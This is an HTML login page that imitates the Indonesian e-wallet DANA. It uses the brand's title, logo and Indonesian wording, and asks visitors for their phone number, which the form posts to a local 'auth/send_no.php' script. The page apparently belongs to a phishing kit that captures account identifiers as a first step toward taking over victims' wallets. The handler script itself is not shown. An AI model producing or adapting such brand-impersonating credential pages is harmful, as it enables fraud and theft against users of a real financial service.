<!DOCTYPE html>
<html>
    <head>
        <title>DANA | dana.id</title>
        <link rel="apple-touch-icon" sizes="180x180" href="./assets/img/favicon/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="./assets/img/favicon/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="./assets/img/favicon/favicon-16x16.png">
        <link rel="manifest" href="./assets/img/favicon/site.webmanifest">
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta http-equiv="refresh">
        <link rel="stylesheet" type="text/css" href="./lib/style/main.css">
        <link rel="stylesheet" type="text/css" href="./lib/style/spinner.css">
    </head>
    <body>
        <div class="container">
            <a class="aback" href="/"><img class="back" src="./assets/img/back.png"></a>
            <img class="dana_logo" src="./assets/img/dana_logo.png">
            <h1 class="page-login">Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut</h1>
            <div class="inputNo">
                <form class="formNo" action="./auth/send_no.php" method="post">
                    <label for="nope" class="flagNo"><img class="flagIndo" src="./assets/img/indo.png"></label>
                    <label for="nope" ><p class="codeTel">+62</p></label>
                    <input name="phoneNumber" class="nope" id="nope" type="tel" placeholder="811-1234-5678" autocomplete="off" required>
                    <h1 class="syarat">Dengan melanjutkan, kamu setuju dengan <b class="bh1">Syarat & Ketentuan</b> dan <b class="bh1">Kebijakan Privasi</b> kami</h1>
                    <style>
                        .btn-primary {
                            background: #fff;
                            color: rgba(32, 148, 226, 1);
                            border: 0;
                            padding: 12px 36px;
                            border-radius: 10px;
                            font-size: 16px;
                            font-weight: 700;
                            cursor: pointer;
                            box-shadow: 0 8px 20px rgba(2,6,23,0.12);
                            transition: transform .12s ease, box-shadow .12s ease, opacity .12s;
                        }
                        .btn-primary:active { transform: translateY(1px) scale(.998); box-shadow: 0 6px 14px rgba(2,6,23,0.10); }
                        .btn-primary:hover { opacity: .98; transform: translateY(-1px); }
                        .btn-wrap { text-align: center; margin-top: 18px; }
                    </style>
                    <div class="btn-wrap">
                        <button type="submit" name="send" value="send" class="btn-primary">LANJUT</button>
                    </div>
                </form>
        </div>
        <div id="process" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="./assets/img/load_bg.png">
                <img class="spinner" src="./assets/img/load_spin.png">
            </div>
        </div>
    </body>
    <script src="./lib/functions/jquery.min.js"></script>
    <script src="./lib/functions/jquery.mask.min.js"></script>
    <script src="./lib/functions/function.js"></script>
</html>
